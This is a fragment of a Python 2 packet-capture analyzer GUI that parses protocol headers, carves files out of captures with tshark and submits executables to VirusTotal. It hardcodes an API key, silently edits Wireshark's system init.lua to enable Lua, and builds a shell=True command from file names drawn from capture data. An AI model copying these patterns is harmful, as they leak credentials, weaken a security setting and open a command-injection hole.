        if (str(Pcap[pkt].show).split(" ")[30] == "|<LLMNRQuery"):
            LLMNR(Pcap, pkt)
    except:
        pass

def ICMPFunc(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")
        ui.textEdit_2.append("[ICMP]ICMP-Type ="+ str(Pcap[pkt].show).split(" ")[26][5:])
        ui.textEdit_2.append("[ICMP]Code ="+ str(Pcap[pkt].show).split(" ")[27][5:])
        ui.textEdit_2.append("[ICMP]Checksum ="+ str(Pcap[pkt].show).split(" ")[28][7:])
        ui.textEdit_2.append("[ICMP]ID ="+ str(Pcap[pkt].show).split(" ")[29][3:])
        ui.textEdit_2.append("[ICMP]Seq ="+ str(Pcap[pkt].show).split(" ")[30][4:])

        #IPerror(Pcap, pkt)
        ICMPerror(Pcap, pkt)
    except:
        pass

def LLMNR(Pcap, pkt):
        ui.textEdit_2.append("\n[LLMNR]ID ="+ (str(Pcap[pkt].show).split(" ")[32])[3:])
        ui.textEdit_2.append("[LLMNR]QR ="+ (str(Pcap[pkt].show).split(" ")[33])[3:])
        ui.textEdit_2.append("[LLMNR]OP Code ="+ (str(Pcap[pkt].show).split(" ")[34])[7:])
        ui.textEdit_2.append("[LLMNR]C ="+ (str(Pcap[pkt].show).split(" ")[35])[2:])
        ui.textEdit_2.append("[LLMNR]TC ="+ (str(Pcap[pkt].show).split(" ")[36])[3:])
        ui.textEdit_2.append("[LLMNR]Z ="+ (str(Pcap[pkt].show).split(" ")[36])[3:])
        ui.textEdit_2.append("[LLMNR]R Code ="+ (str(Pcap[pkt].show).split(" ")[37])[2:])
        ui.textEdit_2.append("[LLMNR]QD Count ="+ (str(Pcap[pkt].show).split(" ")[38])[6:])
        ui.textEdit_2.append("[LLMNR]AN Count ="+ (str(Pcap[pkt].show).split(" ")[39])[8:])
        ui.textEdit_2.append("[LLMNR]NS Count ="+ (str(Pcap[pkt].show).split(" ")[40])[8:])
        ui.textEdit_2.append("[LLMNR]AR Count ="+ (str(Pcap[pkt].show).split(" ")[41])[8:])
        ui.textEdit_2.append("[LLMNR]QD ="+ (str(Pcap[pkt].show).split(" ")[43])[4:])
        ui.textEdit_2.append("[LLMNR]Q Name ="+ (str(Pcap[pkt].show).split(" ")[45])[6:])
        ui.textEdit_2.append("[LLMNR]Q Type ="+ (str(Pcap[pkt].show).split(" ")[46])[6:])
        ui.textEdit_2.append("[LLMNR]Q Class ="+ (str(Pcap[pkt].show).split(" ")[47])[7:])

def TCP_Func(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n[TCP]Transport Protocol ="+ str(Pcap[pkt].show).split(" ")[24][2:])
        ui.textEdit_2.append("[TCP]Source Port ="+ str(Pcap[pkt].show).split(" ")[26][6:])
        ui.textEdit_2.append("[TCP]Destination Port ="+ str(Pcap[pkt].show).split(" ")[27][6:])
        ui.textEdit_2.append("[TCP]Sequence Number ="+ str(Pcap[pkt].show).split(" ")[28][4:])
        ui.textEdit_2.append("[TCP]ACK Number ="+ str(Pcap[pkt].show).split(" ")[29][4:])
        ui.textEdit_2.append("[TCP]Data offset ="+ str(Pcap[pkt].show).split(" ")[30][8:])
        ui.textEdit_2.append("[TCP]Reserved ="+ str(Pcap[pkt].show).split(" ")[31][9:])
        ui.textEdit_2.append("[TCP]Flags ="+ str(Pcap[pkt].show).split(" ")[32][6:])
        ui.textEdit_2.append("[TCP]Window Size ="+ str(Pcap[pkt].show).split(" ")[33][7:])
        ui.textEdit_2.append("[TCP]Checksum ="+ str(Pcap[pkt].show).split(" ")[34][7:])
        ui.textEdit_2.append("[TCP]Urgent Pointer ="+ str(Pcap[pkt].show).split(" ")[35][7:])

    ##        ui.textEdit_2.append( "[TCP]Options ="+ str(Pcap[pkt-1:pkt]).split(" ")[34][7:]
    except:
        pass

def DHCP_Protocol(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n[DHCP]Protocol ="+ str(Pcap[pkt].show).split(" ")[47][2:])
        ui.textEdit_2.append("[DHCP]Message Type ="+ str(Pcap[pkt].show).split(" ")[49][22:])

        for type_order in range(0, len(DHCP_Msg_Type)):
            if DHCP_Msg_Type[type_order] == str(Pcap[pkt].show).split(" ")[49][22:]:
                globals()["DHCP_" + str(DHCP_Msg_Type[type_order])](Pcap, pkt)
    except:
        pass

def DHCP_ack(Pcap, pkt):
	if str(Pcap[pkt].show).split(" ")[50][:10] == "server_id=":
            ui.textEdit_2.append("[DHCP-ACK]Server IP ="+ str(Pcap[pkt].show).split(" ")[50][10:])
            ui.textEdit_2.append("[DHCP-ACK]Lease Time ="+ str(Pcap[pkt].show).split(" ")[51][11:])
            ui.textEdit_2.append("[DHCP-ACK]Renewal Time ="+ str(Pcap[pkt].show).split(" ")[52][13:])
            ui.textEdit_2.append("[DHCP-ACK]Rebinding Time ="+ str(Pcap[pkt].show).split(" ")[53][15:])
            ui.textEdit_2.append("[DHCP-ACK]Subnet Mask ="+ str(Pcap[pkt].show).split(" ")[54][12:])
            ui.textEdit_2.append("[DHCP-ACK]Router ="+ str(Pcap[pkt].show).split(" ")[55][7:])
            ui.textEdit_2.append("[DHCP-ACK]Domain ="+ str(Pcap[pkt].show).split(" ")[56][7:])
	else:
            ui.textEdit_2.append("[DHCP-ACK]Renewal Time ="+ str(Pcap[pkt].show).split(" ")[50][13:])
            ui.textEdit_2.append("[DHCP-ACK]Rebinding Time ="+ str(Pcap[pkt].show).split(" ")[51][15:])
            ui.textEdit_2.append("[DHCP-ACK]Lease Time ="+ str(Pcap[pkt].show).split(" ")[52][11:])
            ui.textEdit_2.append("[DHCP-ACK]Server ID ="+ str(Pcap[pkt].show).split(" ")[53][10:])
            ui.textEdit_2.append("[DHCP-ACK]Subnet Mask ="+ str(Pcap[pkt].show).split(" ")[54][12:])

def DHCP_request(Pcap, pkt):
	if str(Pcap[pkt].show).split(" ")[50][:15] == "requested_addr=":
	    ui.textEdit_2.append("[DHCP-Request]Requested IP ="+ str(Pcap[pkt].show).split(" ")[50][15:])
	    ui.textEdit_2.append("[DHCP-Request]Hostname ="+ str(Pcap[pkt].show).split(" ")[51][9:])
	else:
            ui.textEdit_2.append("[DHCP-Request]Ciaddress ="+ str(Pcap[pkt].show).split(" ")[50][8:])
            ui.textEdit_2.append("[DHCP-Request]Yiaddress ="+ str(Pcap[pkt].show).split(" ")[51][8:])
            ui.textEdit_2.append("[DHCP-Request]Siaddress ="+ str(Pcap[pkt].show).split(" ")[52][8:])
            ui.textEdit_2.append("[DHCP-Request]Giaddress ="+ str(Pcap[pkt].show).split(" ")[53][8:])

def UDPFunc(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")
        ui.textEdit_2.append("\n[UDP]Transport Protocol ="+ str(Pcap[pkt].show).split(" ")[24][2:])
        ui.textEdit_2.append("[UDP]Source Port ="+ str(Pcap[pkt].show).split(" ")[26][6:])
        ui.textEdit_2.append("[UDP]Destination Port ="+ str(Pcap[pkt].show).split(" ")[27][6:])
        ui.textEdit_2.append("[UDP]Length ="+ str(Pcap[pkt].show).split(" ")[28][4:])
        ui.textEdit_2.append("[UDP]Checksum ="+ str(Pcap[pkt].show).split(" ")[29][7:])

        DetectUDP_Services(Pcap, pkt)
        if (str(Pcap[pkt].show).split(" ")[30] == "|<LLMNRQuery"):
            LLMNR(Pcap, pkt)
    except:
        pass

def IP_Header(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")

        DetectEther_Frame(Pcap, pkt)

        ui.textEdit_2.append("[IP]Packet Header ="+ (str(Pcap[pkt].show).split(" ")[9])[2:])
        ui.textEdit_2.append("[IP]Version ="+ (str(Pcap[pkt].show).split(" ")[11])[8:])
        ui.textEdit_2.append("[IP]Internet Header Length (IHL) ="+ (str(Pcap[pkt].show).split(" ")[12])[4:])
        ui.textEdit_2.append("[IP]Type of Service (ToS) ="+ (str(Pcap[pkt].show).split(" ")[13])[4:])
        ui.textEdit_2.append("[IP]Length ="+ (str(Pcap[pkt].show).split(" ")[14])[4:])
        ui.textEdit_2.append("[IP]Id ="+ (str(Pcap[pkt].show).split(" ")[15])[3:])

        if (str(Pcap[pkt].show).split(" ")[16])[6:] != "":
            ui.textEdit_2.append("[IP]Flags ="+ (str(Pcap[pkt].show).split(" ")[16])[6:])

        ui.textEdit_2.append("[IP]Frag ="+ (str(Pcap[pkt].show).split(" ")[17])[5:])
        ui.textEdit_2.append("[IP]Time to Live (TTL) ="+ (str(Pcap[pkt].show).split(" ")[18])[4:])
        ui.textEdit_2.append("[IP]Protocol ="+ (str(Pcap[pkt].show).split(" ")[19])[6:])
        ui.textEdit_2.append("[IP]Checksum ="+ (str(Pcap[pkt].show).split(" ")[20])[7:])
        ui.textEdit_2.append("[IP]Source IP ="+ (str(Pcap[pkt].show).split(" ")[21])[4:])
        ui.textEdit_2.append("[IP]Destionation IP ="+ (str(Pcap[pkt].show).split(" ")[22])[4:])

        ##        if (str(Pcap[pkt-1:pkt]).split(" ")[23])[8:10] != "[]":
        ##                ui.textEdit_2.append( "Options ="+(str(Pcap[pkt-1:pkt]).split(" ")[23])[8:]

        if str(Pcap[pkt].show).split(" ")[19][6:] != "igmp":
            DetectTransport_Protocol(Pcap, pkt)
        else:
            IGMP(Pcap, pkt)
    except:
        pass

def ICMPv6_ND(Pcap, pkt):
        if (str(Pcap[pkt].show).split(" ")[28])[5:] != "":
            ui.textEdit_2.append("\n[ICMPv6-ND]Type ="+ (str(Pcap[pkt].show).split(" ")[28])[5:])
            ui.textEdit_2.append("[ICMPv6-ND]Length ="+ (str(Pcap[pkt].show).split(" ")[29])[4:])

            if (str(Pcap[pkt].show).split(" ")[30][7:] != ""):
                ui.textEdit_2.append("[ICMPv6-ND]LLAddr ="+ (str(Pcap[pkt].show).split(" ")[30])[7:])

def IPv6_HopbyHop_v6(Pcap, pkt):
        ui.textEdit_2.append("\n[IPv6-Hop]Next Header ="+ str(str(Pcap[pkt].show).split(" ")[23][3:]))
        ui.textEdit_2.append("[IPv6-Hop]Length ="+ str(str(Pcap[pkt].show).split(" ")[24][4:]))
        ui.textEdit_2.append("[IPv6-Hop]Autopad ="+ str(str(Pcap[pkt].show).split(" ")[25][8:]))
        ui.textEdit_2.append("[IPv6-Hop]Options ="+ str(str(Pcap[pkt].show).split(" ")[28:35]))
        ui.textEdit_2.append("[IPv6-Hop]Opt. Length ="+ str(str(Pcap[pkt].show).split(" ")[35][7:]))
        ui.textEdit_2.append("[IPv6-Hop]Opt. Data ="+ str(str(Pcap[pkt].show).split(" ")[36][8:]))
        ui.textEdit_2.append("[IPv6-Hop]Raw Load ="+ str(str(Pcap[pkt].show).split(" ")[40][5:]))

def ICMPv6_v6(Pcap, pkt):
        ui.textEdit_2.append("\n[ICMPv6]Type ="+ (str(Pcap[pkt].show).split(" ")[22])[5:] + " " + (str(Pcap[pkt].show).split(" ")[22]))
        ui.textEdit_2.append("[ICMPv6]Code ="+ (str(Pcap[pkt].show).split(" ")[23])[5:])
        ui.textEdit_2.append("[ICMPv6]Checksum ="+ (str(Pcap[pkt].show).split(" ")[24])[6:])

        if str(Pcap[pkt].show).split(" ")[21][4:] != "":
            ui.textEdit_2.append("[ICMPv6]Res ="+ (str(Pcap[pkt].show).split(" ")[25])[4:])

        try:
            ICMPv6_ND(Pcap, pkt)
        except:
            pass


def IP_Func(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")

        ui.textEdit_2.append("[IP]Packet Header =" + (str(Pcap[pkt].show).split(" ")[9])[2:])
        ui.textEdit_2.append("[IP]Version =" + (str(Pcap[pkt].show).split(" ")[11])[8:])
        ui.textEdit_2.append("[IP]Internet Header Length (IHL) =" + (str(Pcap[pkt].show).split(" ")[12])[4:])
        ui.textEdit_2.append("[IP]Type of Service (ToS) =" + (str(Pcap[pkt].show).split(" ")[13])[4:])
        ui.textEdit_2.append("[IP]Length =" + (str(Pcap[pkt].show).split(" ")[14])[4:])
        ui.textEdit_2.append("[IP]Id =" + (str(Pcap[pkt].show).split(" ")[15])[3:])

        if (str(Pcap[pkt].show).split(" ")[12])[6:] != "":
            ui.textEdit_2.append("[IP]Flags =" + (str(Pcap[pkt].show).split(" ")[16])[6:])

        ui.textEdit_2.append("[IP]Frag =" + (str(Pcap[pkt].show).split(" ")[17])[5:])
        ui.textEdit_2.append("[IP]Time to Live (TTL) =" + (str(Pcap[pkt].show).split(" ")[18])[4:])
        ui.textEdit_2.append("[IP]Protocol =" + (str(Pcap[pkt].show).split(" ")[19])[6:])
        ui.textEdit_2.append("[IP]Checksum =" + (str(Pcap[pkt].show).split(" ")[20])[7:])
        ui.textEdit_2.append("[IP]Source IP =" + (str(Pcap[pkt].show).split(" ")[21])[4:])
        ui.textEdit_2.append("[IP]Destionation IP =" + (str(Pcap[pkt].show).split(" ")[22])[4:])

        ##        if (str(Pcap[pkt-1:pkt]).split(" ")[19])[8:10] != "[]":
        ##                ui.textEdit_2.append( "Options ="+(str(Pcap[pkt-1:pkt]).split(" ")[23])[8:]

    except:
        pass

def ARP_Func(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")
        ui.textEdit_2.append("[ARP]Packet Header ="+ (str(Pcap[pkt].show).split(" ")[9])[2:])
        ui.textEdit_2.append("[ARP]Hardware Type ="+ (str(Pcap[pkt].show).split(" ")[11][7:]))
        ui.textEdit_2.append("[ARP]Transportation Type ="+ (str(Pcap[pkt].show).split(" ")[12])[7:])
        ui.textEdit_2.append("[ARP]Hardware Address Length ="+ (str(Pcap[pkt].show).split(" ")[13])[6:])
        ui.textEdit_2.append("[ARP]Protocol Address Length ="+ (str(Pcap[pkt].show).split(" ")[14])[5:])
        ui.textEdit_2.append("[ARP]Op Code ="+ (str(Pcap[pkt].show).split(" ")[15])[3:])
        ui.textEdit_2.append("[ARP]Source MAC ="+ (str(Pcap[pkt].show).split(" ")[16])[6:])
        ui.textEdit_2.append("[ARP]Source IP ="+ (str(Pcap[pkt].show).split(" ")[17])[5:])
        ui.textEdit_2.append("[ARP]Destination MAC ="+ (str(Pcap[pkt].show).split(" ")[18])[6:])
        ui.textEdit_2.append("[ARP]Destination IP ="+ (str(Pcap[pkt].show).split(" ")[19])[5:])

        try:
            if (str(Pcap[pkt].show).split(" ")[20]) != "|>>]":
                #Padding(Pcap, pkt)
		pass
        except:
            pass
    except:
        pass

def IPv6_Header(Pcap, pkt):
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")

        DetectEther_Frame(Pcap, pkt)

        ui.textEdit_2.append("[IPv6]Packet Header ="+ (str(Pcap[pkt].show).split(" ")[9])[2:])
        ui.textEdit_2.append("[IPv6]Version ="+ (str(Pcap[pkt].show).split(" ")[11])[8:])
        ui.textEdit_2.append("[IPv6]Traffic Class (TC) ="+ (str(Pcap[pkt].show).split(" ")[12])[3:])
        ui.textEdit_2.append("[IPv6]Flow Label (FL) ="+ (str(Pcap[pkt].show).split(" ")[13])[3:])
        ui.textEdit_2.append("[IPv6]Payload Length ="+ (str(Pcap[pkt].show).split(" ")[14])[5:])
        ui.textEdit_2.append("[IPv6]Next Header ="+ (str(Pcap[pkt].show).split(" ")[15])[3:])

        if (str(Pcap[pkt].show).split(" ")[16] == "Option"):
            ui.textEdit_2.append("[IPv6]Hop Limit ="+ (str(Pcap[pkt].show).split(" ")[18])[5:])
            ui.textEdit_2.append("[IPv6]Source MAC ="+ (str(Pcap[pkt].show).split(" ")[19])[4:])
            ui.textEdit_2.append("[IPv6]Destination MAC ="+ (str(Pcap[pkt].show).split(" ")[20])[4:])
        else:
            ui.textEdit_2.append("[IPv6]Hop Limit ="+ (str(Pcap[pkt].show).split(" ")[16])[5:])
            ui.textEdit_2.append("[IPv6]Source MAC ="+ (str(Pcap[pkt].show).split(" ")[17])[4:])
            ui.textEdit_2.append("[IPv6]Destination MAC ="+ (str(Pcap[pkt].show).split(" ")[18])[4:])

        DetectIPv6_Types(Pcap, pkt)

def UDP_v6(Pcap, pkt):
        ui.textEdit_2.append("\n[UDP]Source Port ="+ (str(Pcap[pkt].show).split(" ")[21])[6:])
        ui.textEdit_2.append("[UDP]Destination Port ="+ (str(Pcap[pkt].show).split(" ")[22])[6:])
        ui.textEdit_2.append("[UDP]Length ="+ (str(Pcap[pkt].show).split(" ")[23])[4:])
        ui.textEdit_2.append("[UDP]Checksum ="+ (str(Pcap[pkt].show).split(" ")[24])[7:])
        try:
            if (str(Pcap[pkt].show).split(" ")[23][0:4] == "load"):
                #ui.textEdit_2.append("\n[MDNS]Raw Data ="+ str(Pcap[pkt].show).split(" ")[27][5:])
		pass
        except:
            pass

def DHCPProtocol(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")
        ui.textEdit_2.append("[DHCP]Protocol ="+ str(Pcap[pkt].show).split(" ")[47][2:])
        ui.textEdit_2.append("[DHCP]Message Type ="+ str(Pcap[pkt].show).split(" ")[49][22:])

        for type_order in range(0, len(DHCP_Msg_Type)):
            if DHCP_Msg_Type[type_order] == str(Pcap[pkt].show).split(" ")[49][22:]:
                globals()["DHCP_" + str(DHCP_Msg_Type[type_order])](Pcap, pkt)
    except:
        pass

def ARP_Header(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")
        DetectEther_Frame(Pcap, pkt)
        ui.textEdit_2.append("[ARP]Packet Header ="+ (str(Pcap[pkt].show).split(" ")[9])[2:])
        ui.textEdit_2.append("[ARP]Hardware Type ="+ (str(Pcap[pkt].show).split(" ")[11][7:]))
        ui.textEdit_2.append("[ARP]Transportation Type ="+ (str(Pcap[pkt].show).split(" ")[12])[7:])
        ui.textEdit_2.append("[ARP]Hardware Address Length ="+ (str(Pcap[pkt].show).split(" ")[13])[6:])
        ui.textEdit_2.append("[ARP]Protocol Address Length ="+ (str(Pcap[pkt].show).split(" ")[14])[5:])
        ui.textEdit_2.append("[ARP]Op Code ="+ (str(Pcap[pkt].show).split(" ")[15])[3:])
        ui.textEdit_2.append("[ARP]Source MAC ="+ (str(Pcap[pkt].show).split(" ")[17])[6:])
        ui.textEdit_2.append("[ARP]Source IP ="+ (str(Pcap[pkt].show).split(" ")[17])[5:])
        ui.textEdit_2.append("[ARP]Destination MAC ="+ (str(Pcap[pkt].show).split(" ")[18])[6:])
        ui.textEdit_2.append("[ARP]Destination IP ="+ (str(Pcap[pkt].show).split(" ")[19])[5:])

        try:
            if (str(Pcap[pkt].show).split(" ")[20]) != "|>>]":
                pass
                #Padding(Pcap, pkt)
        except:
            pass
    except:
        pass

def Padding(Pcap, pkt):
        ui.textEdit_2.append("\n[Padding]Load Raw ="+ (str(Pcap[pkt].show).split(" ")[18])[5:])

def File_Exct(Pcap_File):
    if not os.path.isdir(desktop+"files"):
        os.makedirs(desktop+"files")
    outdirr = desktop + "files/"

    def parse_http_stream(matching_item):
      end_of_header=-1
      file_bytes=binascii.unhexlify(matching_item[1].replace(":","").strip("\""))
      try:
        end_of_header=file_bytes.index('\r\n\r\n')+4
      except ValueError:
        return
      if 'Content-Encoding: gzip' in file_bytes[:end_of_header]:
        buf=StringIO(file_bytes[end_of_header:])
        f = gzip.GzipFile(fileobj=buf)
        file_bytes = f.read()
      else:
        file_bytes = file_bytes[end_of_header:]
      return ["http_stream_"+matching_item[2].strip("\""),file_bytes]

    def parse_smb_stream(matching_item):
      file_bytes=binascii.unhexlify(matching_item[4].replace(":","").strip("\""))
      return ["smb_id_" + matching_item[3].strip("\""), file_bytes]

    def parse_tftp_stream(matching_item):
      file_bytes=binascii.unhexlify(matching_item[5].replace('\"','').replace(":",""))
      file_name=""
      file_name="tftp_stream_" + matching_item[6].strip("\"")

      return [file_name,file_bytes]

    def extract_files(outdir, infile, displayfilter):
      if displayfilter=='':
        hex_stream_data_list = check_output(["tshark", "-r", infile, "-Y", "(http.content_length > 0 || (smb.file_data && smb.remaining==0) || ftp-data || tftp.opcode==3)", "-T", "fields", "-e", "_ws.col.Protocol", "-e", "tcp.reassembled.data", "-e", "tcp.stream", "-e", "smb.fid", "-e", "smb.file_data","-e", "data", "-e", "tftp.source_file", "-e", "tftp.destination_file", "-e", "udp.srcport", "-e", "udp.dstport", "-E", "quote=d","-E", "occurrence=a", "-E", "separator=|"]).split()
      else:
        hex_stream_data_list = check_output(["tshark", "-r", infile, "-Y", displayfilter + " && (http.content_length > 0 || (smb.file_data && smb.remaining==0) || ftp-data || tftp.opcode==3)", "-T", "fields", "-e", "_ws.col.Protocol", "-e", "tcp.reassembled.data", "-e", "tcp.stream", "-e", "smb.fid", "-e", "smb.file_data","-e", "data", "-e", "tftp.source_file", "-e", "tftp.destination_file", "-e", "udp.srcport", "-e", "udp.dstport", "-E", "quote=d","-E", "occurrence=a", "-E", "separator=|"]).split()
      ftp_data_streams=[]
      reassembled_streams=[]
      for matching_item in hex_stream_data_list:
        x_item=matching_item.split("|")
        x_protocol=x_item[0].strip("\"")
        if (x_protocol=='HTTP' or x_protocol=='HTTP/XML'):
          parsed_stream = parse_http_stream(x_item)
          if parsed_stream is not None:
            search_index=[x for x,y in enumerate(reassembled_streams) if parsed_stream[0] in y[0]]
            if len(search_index)>0:
              parsed_stream[0]=parsed_stream[0]+"_"+str(len(search_index))
            reassembled_streams.append(parsed_stream)
        elif x_protocol=='SMB':
          parsed_stream = parse_smb_stream(x_item)
          search_index=[x for x,y in enumerate(reassembled_streams) if (y[0])==parsed_stream[0]]
          if len(search_index)>0:
            reassembled_streams[search_index[0]][1]=reassembled_streams[search_index[0]][1]+parsed_stream[1]
          else:
            reassembled_streams.append(parsed_stream)
        elif x_protocol=='TFTP':
          parsed_stream = parse_tftp_stream(x_item)
          search_index=[x for x,y in enumerate(reassembled_streams) if (y[0])==parsed_stream[0]]
          if len(search_index)>0:
            reassembled_streams[search_index[0]][1]=reassembled_streams[search_index[0]][1]+parsed_stream[1]
          else:
            reassembled_streams.append(parsed_stream)
        elif x_protocol=='FTP-DATA':
          ftp_data_streams.append(x_item[2].strip("\""))
        elif x_protocol!='':
          pass

      for reassembled_item in reassembled_streams:
        fh=open(os.path.join(outdir,reassembled_item[0]),'w')
        fh.write(reassembled_item[1])
        fh.close()

      for stream_number in ftp_data_streams:
        hex_stream_list = check_output(["tshark", "-q", "-n", "-r", infile, "-z", "follow,tcp,raw," + stream_number]).split("\n")
        list_length = len(hex_stream_list)
        hex_stream_text = ''.join(hex_stream_list[6:list_length-2])
        file_bytes=binascii.unhexlify(hex_stream_text)
        fh=open(os.path.join(outdir,'ftp_stream_'+stream_number),'w')
        fh.write(file_bytes)
        fh.close()
    ui.fileResult.append("\nResults for <<<'" + str(Pcap_File) +"'>>>\n")
    extract_files(outdirr,Pcap_File,"")
    detect_exe(outdirr)

def detect_exe(outdirr):
    global vt
    none = 0
    for file in os.listdir(outdirr):
        mime = subprocess.Popen("/usr/bin/file " + outdirr + file, shell=True,stdout=subprocess.PIPE).communicate()[0]
        if "executable" in mime:
            try:
                vt = vt()
                vt.scanfile(outdirr+file)
                vt.out('print')
                vt.getfile(outdirr+file)
                none = + 1
            except:
                pass
    if none == 0:
        ui.fileResult.append("[LOG] Malicious File Not Found.")

class vt:
    def __init__(self):
        try:
            import requests
        except:
            ui.fileResult.append('[Warning] request module is missing. requests module is required in order to upload new files for scan.\nYou can install it by running: pip install requests.')

        self.api_key = '8b83c9e609de18877677ec074bcdde6193f1660b7940f0d218a5700137f153d1'
        self.api_url = 'https://www.virustotal.com/vtapi/v2/'
        self._output = "print"
        self.errmsg = 'Something went wrong. Please try again later, or contact us.'

    def handleHTTPErros(self, code):
        if code == 404:
            ui.fileResult.append( self.errmsg + '\n[Error 404].')
            return 0
        elif code == 403:
            ui.fileResult.append( 'You do not have permissions to make that call.\nThat should not have happened, please contact us.\n[Error 403].')
            return 0
        elif code == 204:
            ui.fileResult.append( 'The quota limit has exceeded, please wait and try again soon.\nIf this problem continues, please contact us.\n[Error 204].')
            return 0
        else:
            ui.fileResult.append( self.errmsg + '\n[Error ' + str(code) + ']')
            return 0

    def out(self, xformat):
        if xformat == "print":
            self._output = "print"
        elif xformat == "html":
            self._output = "html"
        else:
            self._output = "json"

    def scanfile(self, file):
        url = self.api_url + "file/scan"
        files = {'file': open(file, 'rb')}
        headers = {"apikey": self.api_key}
        try:
            response = requests.post(url, files=files, data=headers)
            xjson = response.json()
            response_code = xjson['response_code']
            verbose_msg = xjson['verbose_msg']
            if response_code == 1:
                ui.fileResult.append( verbose_msg )
                return xjson
            else:
                ui.fileResult.append( verbose_msg )

        except urllib2.HTTPError, e:
            self.handleHTTPErros(e.code)
        except urllib2.URLError, e:
            ui.fileResult.append('URLError: ' + str(e.reason))
        except Exception:
            import traceback
            ui.fileResult.append('[ERROR] Generic Exception: ' + traceback.format_exc())

    def getfile(self, file):
        if os.path.isfile(file):
            f = open(file, 'rb')
            file = hashlib.sha256(f.read()).hexdigest()
            f.close()
        url = self.api_url + "file/report"
        parameters = {"resource": file, "apikey": self.api_key}
        data = urllib.urlencode(parameters)
        req = urllib2.Request(url, data)
        try:
            response = urllib2.urlopen(req)
            xjson = response.read()
            response_code = json.loads(xjson).get('response_code')
            verbose_msg = json.loads(xjson).get('verbose_msg')
            if response_code == 1:
                ui.fileResult.append(verbose_msg)
                return self.report(xjson)
            else:
                ui.fileResult.append(verbose_msg)

        except urllib2.HTTPError, e:
            self.handleHTTPErros(e.code)
        except urllib2.URLError, e:
            ui.fileResult.append('URLError: ' + str(e.reason))
        except Exception:
            import traceback
            ui.fileResult.append('generic exception: ' + traceback.format_exc())

    def report(self, jsonx):
        avlist = []
        jsonx = json.loads(jsonx)
        total = jsonx.get('total')
        positive = jsonx.get('positives')
        ui.fileResult.append('\nDetection ratio: ' + str(positive) + "/" + str(total))
        scans = jsonx.get('scans')
        for av in scans.iterkeys():
            res = scans.get(av)
            if res.get('detected') == True:
                avlist.append('+ ' + av + ':  ' + res.get('result'))
        if positive > 0:
            ui.fileResult.append("[DETECTION] Malicious File Found!")
            ui.fileResult.append(("Possible Type: " + str((str(avlist[2]).split(":"))[1])))
            return avlist
        else:
            ui.fileResult.append("[LOG] Malicious File Not Found!")
            return 0

    def setkey(self, key):
        self.api_key = key

def startPcap(Pcap_File, type):
    Pcap = rdpcap(Pcap_File)
    Pcap_Len = len(Pcap)

    if type == "DHCP":
        dhcpFlag = 0
        for pkt in range(1, Pcap_Len):
            try:
                if ("DHCP" == str(Pcap[pkt].show).split(" ")[47][2:]):
		    dhcpFlag += 1
                    DHCPProtocol(Pcap, pkt)
            except:
                pass
	if dhcpFlag == 0:
	    ui.textEdit_2.append('No DHCP Packet Found!')


    elif type == "ARP":
	arpFlag = 0
        for pkt in range(1, Pcap_Len):
            try:
                if ("ARP" == str(Pcap[pkt].show).split(" ")[9][2:]):
		    arpFlag += 1
                    ARP_Func(Pcap, pkt)
            except:
                pass
	if arpFlag == 0:
	    ui.textEdit_2.append('No ARP Packet Found!')


    elif type == "ICMP":
	icmpFlag = 0
        for pkt in range(1, Pcap_Len):
            try:
                if ("ICMP" == str(Pcap[pkt].show).split(" ")[24][2:]):
		    icmpFlag += 1
                    ICMPFunc(Pcap, pkt)
            except:
                pass
	if icmpFlag == 0:
	    ui.textEdit_2.append('No ICMP Packet Found!')

    elif type == "TCP":
	tcpFlag = 0
        for pkt in range(1, Pcap_Len):
            try:
                if ("TCP" == str(Pcap[pkt].show).split(" ")[24][2:]):
		    tcpFlag += 1
                    TCPFunc(Pcap, pkt)
            except:
                pass
	if tcpFlag == 0: 
	    ui.textEdit_2.append('No TCP Packet Found!')


    elif type == "UDP":
	udpFlag = 0
        for pkt in range(1, Pcap_Len):
            try:
                if ("UDP" == str(Pcap[pkt].show).split(" ")[24][2:]):
		    udpFlag += 1
                    UDPFunc(Pcap, pkt)
            except:
                pass
	if udpFlag == 0:
	    ui.textEdit_2.append('No UDP Packet Found!')

    elif type == "IP":
	ipFlag = 0
        for pkt in range(1, Pcap_Len):
            try:
                if ("IP" == str(Pcap[pkt].show).split(" ")[9][2:]):
		    ipFlag += 1
                    IP_Func(Pcap, pkt)
            except:
                pass
	if ipFlag == 0:
	    ui.textEdit_2.append('No IP Packet Found!')
    else:
        ui.textEdit_2.clear()
        DetectPacket_Header(Pcap, Pcap_Len)

def analyzer():
    file_Path = ui.iSelectLabel.text()
    if file_Path == "":
        ui.msg.setInformativeText("Please, select a pcap file!")
        ui.msg.show()

    else:
        try:
            f1 = open('/usr/share/wireshark/init.lua', 'r+')
            f2 = open('/usr/share/wireshark/init.lua', 'r+')
            for line in f1:
                f2.write(line.replace('disable_lua = true', 'disable_lua = false'))
            f1.close()
            f2.close()
        except:
            pass
        if ui.allPacketbox.isChecked() == True:
            startPcap(file_Path,None)
            if ui.FileCheck.isChecked() == True:
                File_Exct(file_Path)
        else:
            if ui.dhcpbox.isChecked() == False and ui.arpbox.isChecked() == False and ui.icmpbox.isChecked() == False and ui.tcpbox.isChecked() == False and ui.udpbox.isChecked() == False and ui.ipbox.isChecked() == False and ui.FileCheck.isChecked() == False:
                ui.msg.setInformativeText("Please, select a packet type(s)")
                ui.msg.show()

            else:
                ui.textEdit_2.clear()
                if ui.dhcpbox.isChecked() == True:
                    startPcap(file_Path,"DHCP")

                if ui.arpbox.isChecked() == True:
                    startPcap(file_Path,"ARP")

                if ui.icmpbox.isChecked() == True:
                    startPcap(file_Path,"ICMP")

                if ui.tcpbox.isChecked() == True:
                    startPcap(file_Path,"TCP")

                if ui.udpbox.isChecked() == True:
                    startPcap(file_Path,"UDP")

                if ui.ipbox.isChecked() == True:
                    startPcap(file_Path,"IP")

            if ui.FileCheck.isChecked() == True:
                File_Exct(file_Path)


